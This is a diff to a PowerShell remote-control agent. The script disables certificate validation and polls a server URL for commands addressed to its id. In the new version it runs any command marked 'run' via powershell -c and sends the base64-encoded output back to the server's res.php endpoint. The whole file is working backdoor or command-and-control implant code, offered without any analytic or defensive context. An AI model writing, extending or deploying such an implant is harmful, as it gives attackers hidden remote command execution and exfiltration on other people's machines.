@@ -10,6 +10,8 @@ add-type @"
     }
 "@
 [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
+$ProgressPreference = 'SilentlyContinue' 
+
 
 $id=$Args[0]
 $url=$Args[1]
@@ -39,6 +41,7 @@ $Content= $Content.Split(
    [StringSplitOptions]::None)
 
 
+
 if ([string]::IsNullOrWhiteSpace($Content))
     {
 		Start-Sleep -Seconds 10
@@ -49,17 +52,24 @@ if ([string]::IsNullOrWhiteSpace($Content))
 ForEach ($line in $Content)
 {
 	$cmd = Select-String -pattern "$id" -InputObject $line
-	$cmd = ($cmd -split ':',2)[-1]
+	$act = ($cmd -split ':',3)[1]
+if ($act -eq "run")
+    {
+	$cmd = ($cmd -split ':',3)[-1]
 	if ([string]::IsNullOrWhiteSpace($cmd))
     {
+	
         continue
     }
-
-	$Output = powershell -c $cmd '2>&1'
-	$EncOutputBytes = [System.Text.Encoding]::UTF8.GetBytes($Output)
-    $EncOutput = [System.Convert]::ToBase64String($EncOutputBytes)
 	
-$gimme=(Invoke-WebRequest "$url/res.php?res=$EncOutput&id=$id")
-}   
+	$Output = (powershell -c $cmd 2>&1)
+	$EncOutputBytes = [System.Text.Encoding]::UTF8.GetBytes($Output)
+        $EncOutput = [System.Convert]::ToBase64String($EncOutputBytes)
+	
+       $gimme=(Invoke-WebRequest "$url/res.php?res=$EncOutput&id=$id")
+}  
+
 }
 
+ 
+}
